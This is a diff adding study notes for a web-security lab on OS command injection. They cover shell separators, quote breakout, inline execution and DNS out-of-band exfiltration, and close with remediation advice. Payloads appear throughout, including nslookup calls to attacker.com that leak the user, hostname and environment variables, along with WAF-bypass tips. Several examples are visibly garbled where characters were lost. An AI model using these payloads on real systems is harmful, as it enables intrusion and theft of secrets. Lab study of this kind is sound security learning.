@@ -1252,3 +1252,300 @@ nslookup internal-db.attacker.com
 > Blind OS command injection can be exploited using out-of-band techniques by forcing the server to perform external DNS or HTTP requests that confirm command execution.
 
 ---
+
+
+# Lab-5 ✅ Ways of Injecting OS Commands — Full Attacker Notes
+
+---
+
+## 1. Overview
+
+OS command injection is *not about one payload*.
+
+It is about understanding *shell behavior* and choosing the correct technique based on:
+
+- Operating system (Linux / Windows)
+- Output visibility (in-band vs blind)
+- Quoted or unquoted context
+- Filters and WAF behavior
+
+This topic covers *practical real-world injection methods*, not theory.
+
+---
+
+## 2. What Is This Topic About?
+
+This topic explains:
+
+> *How attackers inject OS commands using shell metacharacters, how those characters behave differently, and how to exfiltrate command output even in blind scenarios.*
+
+### Key skills gained:
+
+- Selecting correct command separators
+- Breaking out of quoted contexts
+- Inline command execution
+- DNS-based data exfiltration (OAST)
+
+---
+
+## 3. Core Attacker Mindset
+
+Always think like this:
+
+> *“Where does my input land inside the shell command, and how do I escape or extend it?”*
+
+Everything depends on:
+
+- Context
+- OS
+- Response behavior
+
+---
+
+## 4. Command Separators (Cross-Platform)
+
+These separators work on *both Linux and Windows*:
+```
+& && | ||
+```
+### What they do
+
+| Separator | Behavior |
+|---------|----------|
+| & | Run next command regardless |
+| && | Run only if previous succeeds |
+| | | Pipe output into next command |
+| || | Run next command if previous fails |
+
+---
+
+### Real-world usage examples
+```
+ping 8.8.8.8 & whoami ping 8.8.8.8 && whoami ping 8.8.8.8 | whoami ping 8.8.8.8 || whoami
+```
+---
+
+### When to use which
+
+- & → Fastest confirmation
+- && → Stealthier logic-based execution
+- | → Effective in blind scenarios
+- || → Useful for bypassing logic checks
+
+---
+
+## 5. Unix-Only Command Separators
+
+These work *only on Linux / Unix systems*:
+```
+; newline (\n or 0x0a)
+```
+---
+
+### Examples
+```
+ping 8.8.8.8 whoami
+```
+---
+
+### Why newline injection is powerful
+
+- Often not filtered
+- Invisible in logs
+- Bypasses naive sanitization
+
+---
+
+## 6. Inline Command Execution (Unix Only)
+
+Instead of chaining commands, the injected command executes *inside* the original command.
+
+### Methods
+
+command $(command)
+
+---
+
+### Example
+
+ping whoami ping $(whoami)
+
+### What happens
+
+- whoami executes
+- Output replaces part of the original command
+
+This is *extremely powerful* for blind exfiltration.
+
+---
+
+## 7. Quoted Context Injection (VERY IMPORTANT)
+
+Sometimes input is placed inside quotes:
+
+ping "USER_INPUT"
+
+Your payload must *break out of quotes first*.
+
+---
+
+### Example payloads
+```
+" ; whoami # ' ; whoami # " && whoami #
+```
+---
+
+### Attacker logic
+
+1. Close the quote  
+2. Inject a separator  
+3. Execute command  
+4. Comment out remaining command (optional)
+
+---
+
+## 8. OAST + Inline Execution (Advanced & Real World)
+
+This is *elite-level exploitation*.
+
+### Payload
+```
+& nslookup whoami.attacker.com &
+```
+---
+
+### What happens
+
+- whoami executes
+- Output becomes part of domain name
+- DNS request is sent like:
+
+www-data.attacker.com
+
+---
+
+### Why this is deadly
+
+- No output required
+- No file writes
+- Works asynchronously
+- Extremely stealthy
+
+---
+
+## 9. Highly Possible Real-World Scenarios
+
+### Scenario 1: Feedback / Contact Forms
+
+*Context*  
+Commands execute silently.
+
+*Payload*
+```
+|| nslookup whoami.attacker.com ||
+```
+*Impact*
+- Confirms RCE
+- Leaks execution user
+
+---
+
+### Scenario 2: Network Diagnostic Tools
+
+*Context*  
+Ping / traceroute features.
+
+*Payload*
+```
+8.8.8.8; whoami
+```
+*Impact*
+- Full OS command execution
+
+---
+
+### Scenario 3: Cloud & Containers
+
+*Payload*
+```
+nslookup $(hostname).attacker.com
+```
+*Impact*
+- Container / host name leaked
+- Infrastructure mapping
+
+---
+
+### Scenario 4: WAF-Protected Applications
+
+*Payload*
+```
+|| nslookup id.attacker.com ||
+```
+*Impact*
+- Bypasses output blocking
+- DNS usually allowed
+
+---
+
+## 10. High-Value Endpoints to Test
+
+/ping /check-host /feedback /email/send /backup /maintenance /api/run /diagnostics
+
+> If it touches the OS — *test it*.
+
+---
+
+## 11. Multi-Chain Attack Possibilities
+
+### Chain 1: Injection → DNS Exfiltration → RCE
+
+- Confirm execution
+- Leak execution user
+- Leak hostname
+- Pivot further
+
+---
+
+### Chain 2: Injection → Credential Leak
+
+nslookup $(env).attacker.com
+
+- Environment variables leaked
+- API keys exposed
+
+---
+
+### Chain 3: Injection → Internal Recon
+
+nslookup internal-db.attacker.com
+
+- Internal services discovered
+
+---
+
+## 12. Remediation (What Defenders Must Do)
+
+- ❌ Never build shell commands from user input
+- ✅ Use safe system APIs
+- ✅ Strict input allowlists
+- ✅ Escape arguments properly
+- ✅ Block outbound DNS/HTTP where possible
+
+---
+
+## 13. Extra Notes / Pro Tips
+
+- Always test multiple separators
+- Different shells behave differently
+- DNS OAST is the most reliable blind technique
+- Inline execution bypasses many filters
+- Newline injection is often forgotten by developers
+
+---
+
+## 🔑 One-Line Master Summary
+
+> OS command injection relies on abusing shell metacharacters to escape command context, chain commands, or execute inline payloads, with DNS-based OAST being the most reliable technique in blind scenarios.
+
+---
